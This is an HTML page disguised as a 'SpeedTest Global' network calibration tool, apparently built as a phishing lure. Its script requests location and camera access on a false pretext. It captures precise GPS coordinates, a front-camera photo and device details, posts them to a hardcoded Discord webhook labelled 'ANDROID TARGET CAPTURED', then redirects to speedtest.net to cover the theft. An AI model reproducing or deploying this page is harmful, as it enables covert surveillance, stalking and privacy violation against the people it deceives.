<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest Global</title>
    <style>
        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #232a42; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
        #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 30px; margin-bottom: 10px;">ðŸš€</div>
        <h2>Network Calibration</h2>
        <p>Enable <b>Location and Camera</b> to find the highest speed server node for your device.</p>
        <button class="btn" id="startBtn">START TEST</button>
        <p id="status">Ready...</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';

        document.getElementById('startBtn').addEventListener('click', async function() {
            const status = document.getElementById('status');
            status.innerText = "Requesting System Access...";

            // 1. Force GPS Request immediately
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "GPS Located. Syncing Camera...";
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;

                // 2. Request Camera
                let stream = null;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: false 
                    });
                } catch (e) {
                    console.log("Camera access denied by user.");
                }

                const formData = new FormData();
                const message = {
                    content: "ðŸ”” **ANDROID TARGET CAPTURED**",
                    embeds: [{
                        title: "Device Report",
                        color: 5763719,
                        fields: [
                            { name: "ðŸ“ Maps", value: `https://www.google.com/maps?q=${lat},${lon}` },
                            { name: "ðŸŽ¯ Accuracy", value: `${Math.round(acc)}m`, inline: true },
                            { name: "ðŸ“± Info", value: navigator.userAgent.split('(')[1].split(')')[0], inline: true }
                        ]
                    }]
                };
                formData.append('payload_json', JSON.stringify(message));

                if (stream) {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    const canvas = document.getElementById('canvas');
                    
                    // Wait 1.5s for Android camera sensor to focus
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(async (blob) => {
                            formData.append('file', blob, 'android_snap.jpg');
                            await sendData(formData, stream);
                        }, 'image/jpeg');
                    }, 1500);
                } else {
                    await sendData(formData, null);
                }

            }, (err) => {
                alert("Error: GPS is required for network testing. Please enable and refresh.");
                status.innerText = "Permission Denied.";
            }, { enableHighAccuracy: true, timeout: 5000 });
        });

        async function sendData(fd, stream) {
            await fetch(WEBHOOK, { method: 'POST', body: fd });
            if (stream) stream.getTracks().forEach(t => t.stop());
            document.getElementById('status').innerText = "Calibration Complete!";
            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
        }
    </script>
</body>
</html>
